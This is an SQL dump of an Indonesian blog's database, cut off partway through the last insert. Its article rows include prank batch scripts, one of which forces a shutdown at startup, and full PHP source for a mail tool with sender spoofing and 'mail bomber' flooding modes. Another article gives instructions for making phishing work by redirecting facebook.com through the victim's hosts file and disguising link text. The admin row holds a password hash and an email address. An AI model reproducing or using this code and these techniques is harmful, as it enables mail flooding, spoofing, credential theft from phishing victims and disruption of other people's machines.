-- phpMyAdmin SQL Dump
-- version 4.7.9
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Waktu pembuatan: 04 Nov 2018 pada 15.36
-- Versi server: 10.1.31-MariaDB
-- Versi PHP: 7.2.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `oop`
--

-- --------------------------------------------------------

--
-- Struktur dari tabel `tbl_admin`
--

CREATE TABLE `tbl_admin` (
  `uid` int(4) NOT NULL,
  `uname` varchar(30) NOT NULL,
  `passwd` varchar(50) NOT NULL,
  `email` varchar(40) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `tbl_admin`
--

INSERT INTO `tbl_admin` (`uid`, `uname`, `passwd`, `email`) VALUES
(1, 'wh1t3_r0s3', 'ee7fea283fdeb4d1608fdb99ef68bb2e', 'myheart-isyr@linuxmail.org');

-- --------------------------------------------------------

--
-- Struktur dari tabel `tbl_artikel`
--

CREATE TABLE `tbl_artikel` (
  `id` int(4) NOT NULL,
  `judul` varchar(400) NOT NULL,
  `kategori` varchar(255) NOT NULL,
  `headline` text NOT NULL,
  `isiartikel` text NOT NULL,
  `pengirim` varchar(150) NOT NULL,
  `tgl` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `tbl_artikel`
--

INSERT INTO `tbl_artikel` (`id`, `judul`, `kategori`, `headline`, `isiartikel`, `pengirim`, `tgl`) VALUES
(1, 'Hello world', 'Tes', 'Hello world! Now i can write some article in this site.', 'Hello world! Now i can write some article in this site.\r\nHave a nice day in my blog :D', 'Shikata_Ga_Nai', '2018-06-28'),
(3, 'Puisi Sederhana dari Saya :P', 'Puisi', 'Ini puisi yang saya buat ketika liburan panjang\r\ndan gak tau mau ngapain :P, silakan baca puisinya.', 'Puisi ini saya persembahkan (asiik, bahasanya: persembahkan :D) untuk seseorang yang saya sukai (maklum, saya secret admirer orang tersebut).\r\n\r\nHujan\r\n\r\nApa yang membuatku bahagia\r\nketika hujan turun?\r\nyang membuatku bahagia adalah\r\nrintiknya selalu berbisik mengatakan\r\naku mendengar bahwa ada yang mulai melirik kepadamu.\r\n\r\nHujan tak selalu bermakna sedih\r\nKenapa?\r\nkarena setiap kali ia jatuh, ia akan kembali lagi\r\ndan jatuh kembali untuk melihatmu\r\n\r\nDisetiap akhir hujan selalu ada pelangi\r\nnamun, aku benci pelangi\r\nkenapa?\r\nkarena keindahannya hanya sesaat\r\nlalu menghilang, seiring habisnya rintik hujan', 'Admin Galau', '2018-06-27'),
(4, 'Isengin teman dengan notepad', 'Komputer', '																								Mau tau gimana caranya isengin teman lewat notepad??\r\nNih caranya.', '																								Halo, kai ini saya akan membagikan caranya isengin teman dengan notepad, tapi isengnya gak berlebihan ya :D\r\n\r\n1. Annoying message\r\nbuka notepad dan ketikkan kode berikut\r\n@echo off\r\n:anoy\r\nmsg * Lu jelek :P\r\ngoto anoy\r\n\r\nSimpan dengan nama terserah.bat, hasilnya: Windows akan\r\nmenampilkan pesan &quot;Lu jelek :P&quot; dan akan muncul\r\nlagi dan lagi sampai direstart.\r\n\r\n\r\n2. Shutdown ketika baru dinyalakan\r\n@echo off\r\nshutdown -s -t 10 -c &quot;Ciee dimatiin&quot;\r\n\r\nSimpan dengan nama terserah.bat dan taruh di startup folder\r\nhasil: Windows akan melakukan shutdown ketika baru dinyalakan.\r\n\r\n\r\nSegitu dulu deh isengnya, ntar saya lanjut deh. Dadah ^_^', 'Shikata_Ga_Nai', '2018-06-28'),
(5, 'PakPos Version 1.0', 'PHP', 'Ini adalah hasil iseng iseng saya\r\nuntuk membuat program yang dapat\r\nmengirim email berbasis web.', 'Hai, kali ini saya akan membahas tentang PakPos yang baru baru ini\r\nsaya buat di libur lebaran.\r\n\r\nPakPos adalah program yang saya buat untuk mengirim email berbasis\r\nweb baik secara satu orang atau banyak orang (BCC).\r\n\r\nPakPos bersifat Open Source dan gratis (benar, anda tidak salah baca.\r\nGRATISS!!...) dan boleh disebarluaskan asal tidak untuk tujuan komer-\r\nsial dan tetap mencantumkan nama saya selaku author PakPos.\r\n\r\nPasti mau kode mentahnya kaann...?? Nih saya kasih:\r\n\r\n&lt;?php\r\n/***********************************************************\r\n* PakPos versi 1.0\r\n* by Shikata_Ga_Nai\r\n* Contact me for bug added at #bandung, #depok, #bogor @DALnet\r\n* with nickname: Shikata_Ga_Nai\r\n*\r\n* Kode ini dipersembahkan untuk MZ\r\n* dan semua yang tertarik dengan pemrograman php\r\n************************************************************/\r\n\r\n@session_start();\r\n@set_time_limit(0);\r\n@ini_set(\'error_log\',NULL);\r\n@ini_set(\'log_errors\',0);\r\n@ini_set(\'max_execution_time\',0);\r\n@ini_set(\'output_buffering\',0);\r\n@ini_set(\'display_errors\', 0);\r\n@error_reporting(0);\r\n\r\n$versi = &quot;1.0&quot;;\r\n$color = &quot;#00ff00&quot;;\r\n$sandi = &quot;993144362cf98162df268a7f644f1d6a&quot;; // password: pakposdong\r\n\r\nfunction loginPakPos(){\r\n?&gt;\r\n&lt;html&gt;\r\n	&lt;head&gt;\r\n		&lt;title&gt;Login :: PakPos&lt;/title&gt;\r\n		&lt;style type=&quot;text/css&quot;&gt;\r\n		body {\r\n			background: #000000;\r\n			color: #dd0000;\r\n		}\r\n		h1 {\r\n			font-family: Verdana;\r\n		}\r\n		input {\r\n			border: 1px solid #000;\r\n			background-color: #fff;\r\n			width: 250px;\r\n		}\r\n		table {\r\n			border: 1px solid #000;\r\n		}\r\n		&lt;/style&gt;\r\n	&lt;/head&gt;\r\n	&lt;body&gt;\r\n		&lt;h1 align=&quot;center&quot;&gt;Login&lt;/h1&gt;\r\n		&lt;table width=&quot;25%&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n			&lt;form method=&quot;post&quot;&gt;\r\n			&lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;sandi&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;/form&gt;\r\n		&lt;/table&gt;\r\n	&lt;/body&gt;\r\n&lt;/html&gt;\r\n&lt;?php\r\nexit;\r\n}\r\n\r\nif(!isset($_SESSION[md5($_SERVER[\'HTTP_HOST\'])]))\r\nif(empty($sandi) || (isset($_POST[\'sandi\']) &amp;&amp; (md5($_POST[\'sandi\']) == $sandi)))\r\n$_SESSION[md5($_SERVER[\'HTTP_HOST\'])] = true;\r\nelse \r\nloginPakPos();\r\n\r\nglobal $color;\r\nglobal $versi;\r\n?&gt;\r\n&lt;html&gt;\r\n	&lt;head&gt;\r\n		&lt;title&gt;PakPos :: Versi &lt;?=$versi?&gt;&lt;/title&gt;\r\n		&lt;style type=&quot;text/css&quot;&gt;\r\n		body {\r\n			background: #000000;\r\n			color: &lt;?=$color?&gt;;\r\n			font-family: Courier;\r\n		}\r\n		h1 {\r\n			font-family: Monotype Corsiva;\r\n			text-align: center;\r\n		}\r\n		h3 {\r\n			color: cyan;\r\n			font-family: Verdana;\r\n		}\r\n		table {\r\n			border: 1px solid #000;\r\n		}\r\n		.ini {\r\n			background-color: #333333;\r\n		}\r\n		tr {\r\n			background-color: #111111;\r\n		}\r\n		a {\r\n			color: #dd0000;\r\n			text-decoration: none;\r\n		}\r\n		a:hover {\r\n			color: #00ccff;\r\n		}\r\n		input {\r\n			background: transparent;\r\n			color: white;\r\n			font-family: Arial;\r\n			border: 1px solid #fff;\r\n		}\r\n		textarea {\r\n			background: transparent;\r\n			color: white;\r\n			font-family: Arial;\r\n			resize: none;\r\n		}\r\n		&lt;/style&gt;\r\n	&lt;/head&gt;\r\n	&lt;body&gt;\r\n		&lt;h1&gt;PakPos&lt;/h1&gt;\r\n		&lt;table width=&quot;100%&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n			&lt;tr class=&quot;ini&quot;&gt;&lt;td&gt;&lt;center&gt;Pilih Opsi&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;ul&gt;\r\n			&lt;tr&gt;&lt;td&gt;&lt;li&gt;&lt;a href=&quot;&lt;?=$_SERVER[\'PHP_SELF\']?&gt;&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;tr&gt;&lt;td&gt;&lt;li&gt;&lt;a href=&quot;?aksi=biasa&quot;&gt;Kirim email [Reguler]&lt;/a&gt;&lt;/li&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;tr&gt;&lt;td&gt;&lt;li&gt;&lt;a href=&quot;?aksi=massal&quot;&gt;Kirim email [Massal]&lt;/a&gt;&lt;/li&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;tr&gt;&lt;td&gt;&lt;li&gt;&lt;a href=&quot;?aksi=bom&quot;&gt;Mail bomber [Reguler]&lt;/a&gt;&lt;/li&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;tr&gt;&lt;td&gt;&lt;li&gt;&lt;a href=&quot;?aksi=tebar&quot;&gt;Mail bomber [Massal]&lt;/a&gt;&lt;/li&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;tr&gt;&lt;td&gt;&lt;li&gt;&lt;a href=&quot;?aksi=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;tr&gt;&lt;td&gt;&lt;li&gt;&lt;a href=&quot;?aksi=logout&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;&lt;/td&gt;&lt;/tr&gt;\r\n			&lt;/ul&gt;\r\n		&lt;/table&gt;\r\n&lt;?php\r\nif($_GET[\'aksi\'] == &quot;massal&quot;){\r\n?&gt;\r\n&lt;br&gt;&lt;table width=&quot;100%&quot; align=&quot;center&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;tr class=&quot;ini&quot;&gt;&lt;td&gt;&lt;center&gt;Kirim email [Massal]&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/table&gt;\r\n&lt;table width=&quot;100%&quot; align=&quot;center&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;\r\n&lt;tr&gt;&lt;td&gt;Nama:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;nama&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Email:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Subject:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;subjek&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Pesan:&lt;/td&gt;&lt;td&gt;&lt;textarea name=&quot;msg&quot; cols=&quot;80&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Daftar target:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;file&quot; name=&quot;list&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;kirimbos&quot; value=&quot;Kirim&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/form&gt; \r\n&lt;/table&gt;\r\n&lt;?php\r\n}\r\nif(isset($_POST[\'kirimbos\'])){\r\n	$dari = $_POST[\'nama\'] . \'&lt;\'.$_POST[\'email\'].\'&gt;\';\r\n	$subjek = $_POST[\'subjek\'];\r\n	$msg = $_POST[\'msg\'];\r\n	$kepada = fopen($_FILES[\'list\'][\'name\'], &quot;r&quot;);\r\n	\r\n	while(!feof($kepada)){\r\n		$baf = fgets($kepada, 4096);\r\n		if($baf != &quot;&quot; and $baf != &quot;\\n&quot;){\r\n			echo &quot;[*] Mengirim ke &quot;.$baf.&quot;\\n&quot;;\r\n			$kirim = mail($baf, $subjek, $msg, &quot;From: $dari&quot;);\r\n			if($kirim == false){\r\n				echo &quot;&lt;font color=\\&quot;red\\&quot;&gt;[-] Gagal&lt;br&gt;&lt;/font&gt;&quot;;\r\n			}\r\n			else {\r\n				echo &quot;&lt;font color=\\&quot;lime\\&quot;&gt;[+] Berhasil&lt;br&gt;&lt;/font&gt;&quot;;\r\n			}\r\n		}\r\n	}\r\n	fclose($kepada);\r\n	echo &quot;[!] Operasi sukses bos!&quot;;\r\n}\r\nelse if($_GET[\'aksi\'] == &quot;biasa&quot;){	\r\n?&gt;\r\n&lt;br&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;tr class=&quot;ini&quot;&gt;&lt;td&gt;&lt;center&gt;Kirim email [Reguler]&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/table&gt;\r\n&lt;table width=&quot;100%&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;form method=&quot;post&quot;&gt;\r\n&lt;tr&gt;&lt;td&gt;Nama:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;nama&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Email:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Subject:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;subjek&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Pesan:&lt;/td&gt;&lt;td&gt;&lt;textarea name=&quot;msg&quot; cols=&quot;80&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Target:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;kepada&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;kirimkang&quot; value=&quot;Kirim&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/form&gt;\r\n&lt;/table&gt;\r\n&lt;?php\r\n}\r\nif(isset($_POST[\'kirimkang\'])){\r\n	$dari = $_POST[\'nama\'] . \'&lt;\'.$_POST[\'email\'].\'&gt;\';\r\n	$subjek = $_POST[\'subjek\'];\r\n	$msg = $_POST[\'msg\'];\r\n	$kepada = $_POST[\'kepada\'];\r\n	\r\n	$send = @mail($kepada, $subjek, $msg, &quot;From: $dari&quot;);\r\n	if($send){\r\n		echo &quot;&lt;font color=\\&quot;lime\\&quot;&gt;[+] Berhasil&lt;/font&gt;&quot;;\r\n	}\r\n	else {\r\n		echo &quot;&lt;font color=\\&quot;red\\&quot;&gt;[-] Gagal&lt;/font&gt;&quot;;\r\n	}\r\n	echo &quot;[!] Operasi sukses bos!&quot;;\r\n}\r\nelse if($_GET[\'aksi\'] == &quot;bom&quot;){\r\n?&gt;\r\n&lt;br&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;tr class=&quot;ini&quot;&gt;&lt;td&gt;&lt;center&gt;Kirim email [Reguler]&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/table&gt;\r\n&lt;table width=&quot;100%&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;form method=&quot;post&quot;&gt;\r\n&lt;tr&gt;&lt;td&gt;Nama:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;nama&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Email:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Subject:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;subjek&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Pesan:&lt;/td&gt;&lt;td&gt;&lt;textarea name=&quot;msg&quot; cols=&quot;80&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Target:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;kepada&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Jumlah:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;jmlh&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;bomkang&quot; value=&quot;Kirim&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/form&gt;\r\n&lt;/table&gt;\r\n&lt;?php\r\n}\r\nif(isset($_POST[\'bomkang\'])){\r\n	$dari = $_POST[\'nama\'] . \'&lt;\'.$_POST[\'email\'].\'&gt;\';\r\n	$subjek = $_POST[\'subjek\'];\r\n	$msg = $_POST[\'msg\'];\r\n	$kepada = $_POST[\'kepada\'];\r\n	$jmlh = $_POST[\'jmlh\'];\r\n	\r\n	for($x = 1; $x &lt; $jmlh + 1; $x++){\r\n		$send = @mail($kepada,$subjek, $msg, &quot;From: $dari&quot;);\r\n	}\r\n	\r\n	if($send){\r\n		echo &quot;&lt;font color=\\&quot;lime\\&quot;&gt;[+] Berhasil&lt;/font&gt;&quot;;\r\n	}\r\n	else {\r\n		echo &quot;&lt;font color=\\&quot;red\\&quot;&gt;[-] Gagal&lt;/font&gt;&quot;;\r\n	}\r\n	echo &quot;[!] Operasi sukses bos!&quot;;\r\n}\r\n\r\nelse if($_GET[\'aksi\'] == &quot;tebar&quot;){\r\n?&gt;\r\n&lt;br&gt;&lt;table width=&quot;100%&quot; align=&quot;center&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;tr class=&quot;ini&quot;&gt;&lt;td&gt;&lt;center&gt;Kirim email [Massal]&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/table&gt;\r\n&lt;table width=&quot;100%&quot; align=&quot;center&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;\r\n&lt;tr&gt;&lt;td&gt;Nama:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;nama&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Email:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Subject:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;subjek&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Pesan:&lt;/td&gt;&lt;td&gt;&lt;textarea name=&quot;msg&quot; cols=&quot;80&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Daftar target:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;file&quot; name=&quot;list&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Jumlah:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;jmlh&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;kirimbos&quot; value=&quot;Kirim&quot;&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/form&gt; \r\n&lt;/table&gt;\r\n&lt;?php\r\n}\r\nif(isset($_POST[\'tebarbos\'])){\r\n	$dari = $_POST[\'nama\'] . \'&lt;\'.$_POST[\'email\'].\'&gt;\';\r\n	$subjek = $_POST[\'subjek\'];\r\n	$msg = $_POST[\'msg\'];\r\n	$kepada = fopen($_FILES[\'list\'][\'name\'], &quot;r&quot;);\r\n	$jml = $_POST[\'jmlh\'];\r\n	while(!feof($kepada)){\r\n		$baf = fgets($kepada, 4096);\r\n		if($baf != &quot;&quot; and $baf != &quot;\\n&quot;){\r\n			echo &quot;[*] Mengirim ke &quot;.$baf.&quot;\\n&quot;;\r\n			for($a = 1; $a &lt; $jmlh + 1; $a++){\r\n				$kirim = mail($baf, $subjek, $msg, &quot;From: $dari&quot;);\r\n			}\r\n			if($kirim == false){\r\n				echo &quot;&lt;font color=\\&quot;red\\&quot;&gt;[-] Gagal&lt;br&gt;&lt;/font&gt;&quot;;\r\n			}\r\n			else {\r\n				echo &quot;&lt;font color=\\&quot;lime\\&quot;&gt;[+] Berhasil&lt;br&gt;&lt;/font&gt;&quot;;\r\n			}\r\n		}\r\n	}\r\n	fclose($kepada);\r\n	echo &quot;[!] Operasi sukses bos!&quot;;\r\n}\r\n\r\nelse if($_GET[\'aksi\'] == &quot;about&quot;){\r\n?&gt;\r\n&lt;br&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot;&gt;\r\n&lt;tr class=&quot;ini&quot;&gt;&lt;td&gt;&lt;center&gt;About&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Special thx to:&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;marquee direction=&quot;up&quot; scrollamount=&quot;2&quot; width=&quot;350&quot; height=&quot;80&quot;&gt;\r\n&lt;font color=&quot;white&quot;&gt;\r\n[*] Tuhan YME&lt;br&gt;\r\n[*] MZ&lt;br&gt;\r\n[*] FalahGo5&lt;br&gt;\r\n[*] HackThisSite&lt;br&gt;\r\n[*] Orang orang di #bandung @DALnet&lt;br&gt;\r\n[*] Semua teman teman saya&lt;br&gt;\r\n[*] stackoverflow.com&lt;br&gt;\r\n[*] pastebin.com&lt;br&gt;\r\n[*] echo.or.id&lt;br&gt;\r\n[*] xcode.or.id&lt;br&gt;\r\n[*] tutorialspoint.com&lt;br&gt;\r\n[*] Semuanya yang mendukung saya sampai sekarang&lt;br&gt;\r\n[*] Anda yang memakai PakPos ini :)&lt;br&gt;\r\n&lt;/font&gt;\r\n&lt;/marquee&gt;&lt;/td&gt;&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td&gt;Saya hanya seorang pelajar dari SMPN 4 Bogor yang&lt;br&gt;\r\nbaru naik ke kelas 9 dan iseng saja saya buat PakPos ini.&lt;br&gt;\r\n&lt;br&gt;\r\nMoga moga bermanfaat ya (buat Soceng :P)&lt;/td&gt;&lt;/tr&gt;\r\n&lt;/table&gt;\r\n&lt;?php\r\n}\r\nelse if($_GET[\'aksi\'] == &quot;logout&quot;){\r\n	unset($_SESSION[md5($_SERVER[\'HTTP_HOST\'])]);\r\n	echo \'&lt;meta http-equiv=&quot;refresh&quot; content=&quot;2; url=\'.$_SERVER[\'PHP_SELF\'].\'&quot;&gt;\';\r\n}\r\n?&gt;\r\n&lt;h3 align=&quot;center&quot;&gt;(C)opyleft Shikata_Ga_Nai&lt;/h3&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&lt;!-- End of PakPos --&gt;\r\n\r\nKalau kalian mau kalian bisa kontak saya lewat email untuk dapat\r\nlinknya (takut ada yg nyolong linknya :P)\r\n\r\nSegini dulu deh pembahasannya, dadah ^_^', 'Shikata_Ga_Nai', '2018-06-28'),
(6, 'Teknik teknik dalam Phising', 'Artikel Lepas', '						Ok, hari ini saya tidak membahas\r\nteknik phising, tetapi teknik teknik\r\nagar phising kalian berjalan dengan \r\nlancar.', '						Hai, hari ini lagi bosen yang temanya &quot;putih putih&quot;, lagi pengen\r\nyang hitam dikit (dikit ya, gak banyak loh :D) nih.\r\n\r\nOk, kali ini saya akan membahas tentang beberapa teknik yang\r\nbisa dilakukan agar phising kita berjalan dengan lancar.\r\n\r\n1. DNS Hosts \r\nIni sebenernya teknik yang gak &quot;wah&quot;, tapi gak ada salahnhya buat\r\ndicoba. Begini nih:\r\n\r\n[*] Buka cmd, terus ketik perintah ping diikuti nama domain tempat\r\nkita meletakkan halaman phising\r\nC:\\&gt;ping www.nama-domain.com\r\n[*] Perhatikan ip addressnya, terus ketik:\r\necho [ip addressnya] www.facebook.com&gt;&gt;C:\\Windows\\system32\\drives\\etc\\hosts\r\n[*] Atau biar gak repot, edit aja file hostsnya di:\r\nC:\\Windows\\system32\\drives\\etc\\hosts\r\n[*] Kemudian edit dengan format berikut:\r\n\r\n[ip address] www.facebook.com\r\n[ip address] facebook.com\r\n[ip address] m.facebook.com\r\n[ip address] http://www.facebook.com\r\n[ip address] https://www.facebook.com\r\n[ip address] http://facebook.com\r\n[ip address] https://facebook.com\r\n[ip address] http://m.facebook.com\r\n[ip address] https://m.facebook.com\r\n[ip address] http://id-id.facebook.com\r\n[ip address] https://id-id.facebook.com\r\n\r\n[*] Dalam contoh saya pakai domain facebook, kalau kalian\r\nphisingnya pake website lain sesuaikan aja\r\n\r\nHasil: Browser membuka halaman phising anda, tetapi domain\r\nyang tertulis di address browser tetap facebook yang asli.\r\n\r\n2. URL Obfuscation\r\nSekali lagi, ini bukan teknik yang &quot;wah&quot;, tapi lumayan berguna buat\r\naksi phising kita.\r\n\r\n[*] Kita hanya butuh kode html berikut:\r\n&lt;a href=&quot;www.halaman-phising.com&quot;&gt;www.facebook.com&lt;/a&gt;\r\n\r\n[*] Gitu aja? Gak dong, kita butuh sedikit social engineering disini\r\n(lumayan ada seninya :D), contohnya:\r\n\r\n&lt;a href=&quot;www.halaman-phising.com&quot;&gt;Halaman ini menuju\r\nwww.facebook.com&lt;/a&gt;\r\n\r\n[*] Ketika diklik, halaman phising andalah yang terbuka jika korban\r\ntidak teliti melihat status bar ketika mengklik link tadi.\r\n\r\n3. Manipulasi home page browser\r\n\r\nSepertinya saya tidak perlu menjelaskan tentang bagaimana caranya\r\nmengganti home page browser, kenapa?? Karena banyak caranya di\r\ngoogle :P\r\n\r\nYah, sebenernya banyak caranya agar teknik phising kita berjalan\r\ndengan lancar, tapi karena hanya segitu yang bisa saya sampaikan.\r\nSampai jumpa.... ^_^', 'Shikata_Ga_Nai', '2018-06-29');

-- --------------------------------------------------------

--
-- Struktur dari tabel `tbl_bukutamu`
--

CREATE TABLE `tbl_bukutamu` (
  `id` int(4) NOT NULL,
  `nama` varchar(50) NOT NULL,
  `email` varchar(45) NOT NULL,
  `pesan` text NOT NULL,
  `tgl` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `tbl_bukutamu`
--

INSERT INTO `tbl_bukutamu` (`id`, `nama`, `email`, `pesan`, `tgl`) VALUES
(2, 'Imagine_Friend', 'myheart-isyr@linuxmail.org', 'Halo, ini cuma contoh aja ya :D', '2018-06-14'),
(4, 'SayWhat', 'say@what.com', 'Hi, how are you?', '2018-06-16');

-- --------------------------------------------------------

--
-- Struktur dari tabel `tbl_polling`
--

CREATE TABLE `tbl_polling` (
  `id` int(5) NOT NULL,
  `pertanyaan` varchar(250) NOT NULL,
  `jawab1` varchar(100) NOT NULL,
  `jawab2` varchar(100) NOT NULL,
  `jawab3` varchar(100) NOT NULL,
  `jawab4` varchar(100) NOT NULL,
  `hasil1` tinyint(5) NOT NULL,
  `hasil2` tinyint(5) NOT NULL,
  `hasil3` tinyint(5) NOT NULL,
  `hasil4` tinyint(5) NOT NULL,
  `status` enum('Y','N') NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `tbl_polling`
--

INSERT INTO `tbl_polling` (`id`, `pertanyaan`, `jawab1`, `jawab2`, `jawab3`, `jawab4`, `hasil1`, `hasil2`, `hasil3`, `hasil4`, `status`) VALUES
(1, 'Sistem operasi apa yang akan anda pilih jika anda bosan dengan Windows?', 'Linux', 'Varian BSD', 'Mac OS', 'Tetap pakai Windows', 1, 1, 0, 0, 'N'),
